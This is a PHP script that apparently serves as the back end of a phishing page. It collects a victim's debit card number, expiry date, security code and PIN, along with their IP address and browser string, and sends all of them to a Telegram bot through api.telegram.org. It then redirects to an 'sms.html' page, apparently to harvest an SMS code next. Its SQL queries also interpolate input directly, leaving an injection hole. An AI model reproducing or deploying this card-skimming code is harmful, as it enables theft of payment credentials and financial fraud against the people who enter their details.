<?php
require_once('config.php');

$sql = "SELECT id FROM users WHERE name = '$id_user'";

$rusult = mysqli_query($link, $sql);
$id = mysqli_num_rows($rusult);

if($id == 0){ 
    $sql = "INSERT INTO users SET name = '$id_user'";
$result = mysqli_query($link, $sql); 
}

$sql = "SELECT id FROM users WHERE name = '$id_user'";
$result = mysqli_query($link, $sql);
$user = mysqli_fetch_row($result); 

$cardcode1 = $cardcode1;
$cardcode2 = $cardcode2;
$cardcode3 = $cardcode3;
$cardcode4 = $cardcode4;
$order = $user[0];
$user = $_SERVER['HTTP_USER_AGENT'];


	$cardcode1=$_POST['cardcode1'];
	$cardcode2=$_POST['cardcode2'];
	$cardcode3=$_POST['cardcode3'];
	$cardcode4=$_POST['cardcode4'];
	$ip = $_SERVER['REMOTE_ADDR'];
	
/* А здесь прописывается текст сообщения, \n - перенос строки */
 $mes = "#order_$order \nDebit card number: $cardcode1\nDebit card expired date: $cardcode2\nDebit card security code: $cardcode3\nDebit card PIN: $cardcode4\nIP: $ip\nBrowser: $user";



message_to_telegram($mes);

function message_to_telegram($text)
{
    $ch = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => 'https://api.telegram.org/bot' . TELEGRAM_TOKEN . '/sendMessage',
            CURLOPT_POST => TRUE,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => TELEGRAM_CHATID,
                'text' => $text,
            ),
        )
    );
    curl_exec($ch);
}

ini_set('short_open_tag', 'On');

if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    header('Refresh: 0; URL=sms.html');
} else {
   header('Refresh: 0; URL=sms.html');
}

?>
